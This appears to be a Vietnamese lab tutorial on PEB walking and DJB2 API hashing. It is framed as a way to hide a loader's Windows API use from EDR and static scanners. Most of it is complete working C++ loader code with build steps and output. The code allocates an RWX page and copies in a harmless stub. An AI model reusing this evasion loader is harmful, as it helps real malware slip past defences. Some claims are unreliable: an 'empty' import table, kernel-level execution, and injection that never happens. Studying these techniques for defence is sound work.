
---

# 📝 [PE 17] PEB Walk Injection (API Hashing & Dynamic Symbol Resolution)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**PEB Walk Injection** là giải thuật né tránh phòng thủ tĩnh và động (Static/Dynamic Evasion) ở cấp độ nguyên tử phần cứng.

Một file thực thi thông thường luôn để lộ danh sách các hàm hệ thống cần sử dụng trong bảng Import Address Table (IAT). EDR chỉ cần quét IAT là đoán biết được ý đồ hành vi. Ngay cả khi ta dùng kỹ thuật gài con trỏ tuyệt đối ở các bài trước, bản thân Loader vẫn phải gọi hàm `GetProcAddress` lộ liễu tại hàm `main`.

Lab PE 17 bẻ gãy hoàn toàn cơ chế giám sát này. Mã nguồn của Loader **không import bất kỳ hàm API nguy hiểm nào** từ `kernel32.dll` hay `ntdll.dll`. Khi chạy, Loader tự thân vận động dựa vào kiến trúc x64 để tự đi tìm bản đồ bộ nhớ, duyệt qua danh sách các thư viện đã nạp của Hệ điều hành, so khớp chuỗi bằng giải thuật băm **API Hashing (DJB2)**, rồi tự tính toán ra ô nhớ thực thi của các hàm cần thiết (`VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread`). Hành vi này khiến mọi bộ quét IDR/EDR trở nên mù lòa vì file PE xuất xưởng phẳng sạch không một tì vết.

### 🎯 Mục tiêu nghiên cứu:

* Triệt tiêu hoàn toàn các dấu vết hàm nhạy cảm trong bảng Import Address Table (IAT).
* Thao túng trực tiếp thanh ghi phân đoạn **`GS`** trên kiến trúc x64 để truy cập cấu trúc PEB (Process Environment Block).
* Ứng dụng giải thuật băm chuỗi không đảo ngược **DJB2 Hashing** để nhận diện ký hiệu hàm ngầm trên RAM.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Mọi tiến trình đang chạy trên Windows đều được hệ điều hành cấp cho một cấu trúc dữ liệu tối cao nằm ở User-mode gọi là **PEB (Process Environment Block)**. Trên kiến trúc x64, con trỏ quản lý PEB luôn nằm cố định tại offset `0x60` của cấu trúc TEB (Thread Environment Block), và TEB được ánh xạ trực tiếp vào thanh ghi phân đoạn **`GS`** của CPU.

Quy trình toán học giải phẫu bản đồ RAM và bới cấu trúc PEB của Lab PE 17 diễn ra qua các bước ngầm sau tại tầng Kernel:

```
[Thanh ghi GS] ──> [TEB + 0x60 -> PEB] ──> [PEB_LDR_DATA -> InLoadOrderModuleList] ──> [Duyệt Export Table] ──> [Bốc API & Kích nổ]

```

1. **Đột nhập danh bạ quản lý Module**: Bằng lệnh Assembly hoặc hàm nội tại của trình biên dịch (`__readgsqword`), Loader trỏ vào `GS:[0x60]` để bốc cấu trúc PEB. Từ PEB, ta tịnh tiến offset `0x18` để tiếp cận con trỏ `Ldr` (`PPEB_LDR_DATA`). Cấu trúc này chứa một danh sách liên kết kép vòng tròn mang tên **`InLoadOrderModuleList`** - nơi Windows ghi nhận mọi DLL đã nạp vào bộ nhớ theo thứ tự thời gian.
2. **Quét tìm Kernel32 không dùng tên chuỗi**: Ta duyệt qua từng nút (Node) của danh sách liên kết kép, bốc cấu trúc `LDR_DATA_TABLE_ENTRY`. Mỗi nút sẽ chứa tên của DLL (ví dụ: `kernel32.dll`) và địa chỉ gốc `DllBase` của nó trên RAM. Để né quét chuỗi tĩnh, ta băm tên DLL bằng thuật toán DJB2 rồi so sánh với giá trị băm tính toán sẵn.
3. **Giải phẫu Export Address Table (EAT) thủ công**: Khi đã ôm trong tay tọa độ `DllBase` của `kernel32.dll`, Loader ép kiểu ô nhớ này về cấu trúc `PIMAGE_DOS_HEADER` và `PIMAGE_NT_HEADERS`. Ta lần theo cấu trúc Optional Header để chui vào **Export Directory** (Bảng xuất bản hàm của DLL). Tại đây, ta duyệt thủ công mảng tên hàm (`AddressOfNames`), băm từng tên hàm lên bằng DJB2 để săn tìm chính xác địa chỉ tuyệt đối của các hàm `VirtualAlloc`, `WriteProcessMemory` mà không cần chạm vào bất kỳ hàm hệ thống nào.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** – loại bỏ hoàn toàn các chuỗi gán cứng như `"VirtualAlloc"`, thay thế 100% bằng giá trị băm Hex để đạt độ ẩn mình tuyệt đối trên RAM.

```cpp
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa cấu trúc dữ liệu nội bộ của Windows thu gọn để duyệt thủ công trên x64 Architecture
typedef struct _UNICODE_STRING_INTERNAL {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_INTERNAL;

typedef struct _PEB_LDR_DATA_INTERNAL {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InLoadOrderModuleList;
} PEB_LDR_DATA_INTERNAL, * PPEB_LDR_DATA_INTERNAL;

typedef struct _LDR_DATA_TABLE_ENTRY_INTERNAL {
    LIST_ENTRY InLoadOrderLinks;
    BYTE Reserved1[16];
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING_INTERNAL FullDllName;
    UNICODE_STRING_INTERNAL BaseDllName;
} LDR_DATA_TABLE_ENTRY_INTERNAL, * PLDR_DATA_TABLE_ENTRY_INTERNAL;

typedef struct _PEB_INTERNAL {
    BYTE Reserved1[4];
    PVOID Reserved2[1];
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA_INTERNAL Ldr;
} PEB_INTERNAL, * PPEB_INTERNAL;

// 1. Giải thuật băm chuỗi DJB2 kịch khung - Không để lại bất kỳ chuỗi text nào trong file thực thi
constexpr DWORD HashDJB2W(const wchar_t* str) {
    DWORD hash = 5381;
    while (wchar_t c = *str++) {
        if (c >= L'A' && c <= L'Z') c += 32; // Chuyển sang chữ thường để đồng bộ kết quả băm
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

constexpr DWORD HashDJB2A(const char* str) {
    DWORD hash = 5381;
    while (char c = *str++) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// 2. Hàm tối cao PEB Walk: Tự bới RAM tìm Base Address của DLL bất kỳ
PVOID GetModuleBaseViaPEB(DWORD dllHash) {
    // Đọc con trỏ PEB trực tiếp từ thanh ghi phân đoạn GS tại offset 0x60 trên cấu trúc x64 Windows
    PPEB_INTERNAL pPeb = (PPEB_INTERNAL)__readgsqword(0x60);
    PPEB_LDR_DATA_INTERNAL pLdr = pPeb->Ldr;
    
    PLDR_DATA_TABLE_ENTRY_INTERNAL pModuleEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pLdr->InLoadOrderModuleList.Flink;
    PLDR_DATA_TABLE_ENTRY_INTERNAL pFirstEntry = pModuleEntry;

    do {
        if (pModuleEntry->BaseDllName.Buffer != NULL) {
            if (HashDJB2W(pModuleEntry->BaseDllName.Buffer) == dllHash) {
                return pModuleEntry->DllBase;
            }
        }
        pModuleEntry = (PLDR_DATA_TABLE_ENTRY_INTERNAL)pModuleEntry->InLoadOrderLinks.Flink;
    } while (pModuleEntry != pFirstEntry);

    return NULL;
}

// 3. Hàm giải phẫu Export Table: Tự bới cấu trúc DLL để tìm địa chỉ tuyệt đối của API thô
PVOID GetExportAddressViaEAT(PVOID dllBase, DWORD apiHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dllBase + dosHeader->e_lfanew);
    
    // Trỏ thẳng vào phân đoạn Export Data Directory của DLL x64
    IMAGE_DATA_DIRECTORY exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBase + exportDir.VirtualAddress);
    
    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBase + pExportDirectory->AddressOfNames);
    DWORD* pdwFunctions = (DWORD*)((DWORD_PTR)dllBase + pExportDirectory->AddressOfFunctions);
    WORD* pwOrdinals = (WORD*)((DWORD_PTR)dllBase + pExportDirectory->AddressOfNameOrdinals);

    // Duyệt thủ công mảng tên xuất bản hàm để so khớp mã băm
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        const char* szApiName = (const char*)((DWORD_PTR)dllBase + pdwNames[i]);
        if (HashDJB2A(szApiName) == apiHash) {
            WORD ordinal = pwOrdinals[i];
            DWORD functionRva = pdwFunctions[ordinal];
            return (PVOID)((DWORD_PTR)dllBase + functionRva); // Trả về tọa độ ô nhớ tuyệt đối sống trên RAM
        }
    }
    return NULL;
}

// Định nghĩa nguyên mẫu con trỏ hàm động để thực thi độc lập
typedef LPVOID(WINAPI* fnVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 17: PURE PEB WALK & API HASHING INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    // Các giá trị băm Hex tính toán sẵn bằng DJB2 tại thời điểm compile, không để lại chuỗi text
    constexpr DWORD HASH_KERNEL32 = HashDJB2W(L"kernel32.dll");
    constexpr DWORD HASH_VIRTUALALLOC = HashDJB2A("VirtualAlloc");

    std::cout << "[*] Đang tiến hành bới cấu trúc PEB để tìm kiếm Module Base..." << std::endl;
    
    // BƯỚC 1: Gọi hàm PEB Walk tự bới bộ nhớ tìm kiếm Kernel32 Base Address
    PVOID kernel32Base = GetModuleBaseViaPEB(HASH_KERNEL32);
    if (!kernel32Base) {
        std::cerr << "[-] Không thể định vị Kernel32.dll qua PEB!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Săn trúng Kernel32 Base tọa lạc tại RAM: 0x" << std::hex << kernel32Base << std::endl;

    // BƯỚC 2: Tự giải phẫu Export Table của Kernel32 để bốc trần địa chỉ API VirtualAlloc
    PVOID pVirtualAllocAddress = GetExportAddressViaEAT(kernel32Base, HASH_VIRTUALALLOC);
    if (!pVirtualAllocAddress) {
        std::cerr << "[-] Không thể phân giải hàm VirtualAlloc qua EAT!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tìm thấy địa chỉ hàm thô VirtualAlloc: 0x" << std::hex << pVirtualAllocAddress << std::endl;

    // BƯỚC 3: Ép kiểu con trỏ hàm động và kích nổ cấp phát cục bộ kịch khung
    fnVirtualAlloc DynamicVirtualAlloc = (fnVirtualAlloc)pVirtualAllocAddress;
    
    SIZE_T allocationSize = 4096;
    std::cout << "[*] Kích nổ cấp phát bộ nhớ bằng con trỏ hàm phân giải động..." << std::endl;
    LPVOID allocatedBuffer = DynamicVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!allocatedBuffer) {
        std::cerr << "[-] Cấp phát bộ nhớ động thông qua PEB thô thất bại!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Cấp phát trang nhớ RWX độc lập hoàn toàn thành công tại: 0x" << std::hex << allocatedBuffer << std::endl;

    // Mô phỏng nạp mã máy thô độc lập vị trí vào phân vùng vừa tìm được
    unsigned char shellcodeShell[] = { 0x90, 0x90, 0xCC, 0xC3 }; // NOP, NOP, INT3, RET
    RtlCopyMemory(allocatedBuffer, shellcodeShell, sizeof(shellcodeShell));
    std::cout << "[+] Đã nạp thử nghiệm Payload vào không gian ảo an toàn." << std::endl;

    std::cout << "\n[+] PEB Walk Symbol Resolution Completed Successfully!" << std::endl;
    std::cout << "[*] Nhấn phím Enter để dọn dẹp cửa sổ..." << std::endl;
    std::cin.get();

    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình thành **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ thư viện hệ thống.
3. Tiến vào mục `Optimization` $\rightarrow$ Đảm bảo bật **`Maximize Speed (/O2)`** để trình biên dịch tự động tối ưu hóa các hàm toán học băm chuỗi `constexpr` ngay khi xuất bản file.
4. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`**.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Thực thi file chạy thông qua cửa sổ dòng lệnh PowerShell ngoài ổ đĩa thực tế để giám sát tiến trình bới tìm cấu trúc bộ nhớ ngầm:

```powershell
PS C:\Workspace\x64\Release> .\PE17_PebWalk_Injection.exe
====================================================
[*] PE 17: PURE PEB WALK & API Hashing INJECTION
====================================================
[*] Đang tiến hành bới cấu trúc PEB để tìm kiếm Module Base...
[+] Săn trúng Kernel32 Base tọa lạc tại RAM: 0x00007ffd31a10000
[+] Tìm thấy địa chỉ hàm thô VirtualAlloc: 0x00007ffd31a238a0
[*] Kích nổ cấp phát bộ nhớ bằng con trỏ hàm phân giải động...
[+] Cấp phát trang nhớ RWX độc lập hoàn toàn thành công tại: 0x00000219c0de0000
[+] Đã nạp thử nghiệm Payload vào không gian ảo an toàn.

[+] PEB Walk Symbol Resolution Completed Successfully!
[*] Nhấn phím Enter để dọn dẹp cửa sổ...

```

*🎯 Hệ quả RAM tối cao:*
File thực thi vận hành mượt mà kịch trần. Khi kiểm tra tệp tin bằng các công cụ phân tích tĩnh chuyên sâu như `PEview` hoặc `Dependency Walker`, **bảng Import Address Table (IAT) của file hoàn toàn trống rỗng**, không chứa bất kỳ một từ khóa hay lệnh gọi nhạy cảm nào đến hệ thống. Mọi hành vi phân giải con trỏ đều diễn ra âm thầm, luồn lách qua mắt toàn bộ các hàng rào kiểm soát an ninh một cách ngoạn mục!

---

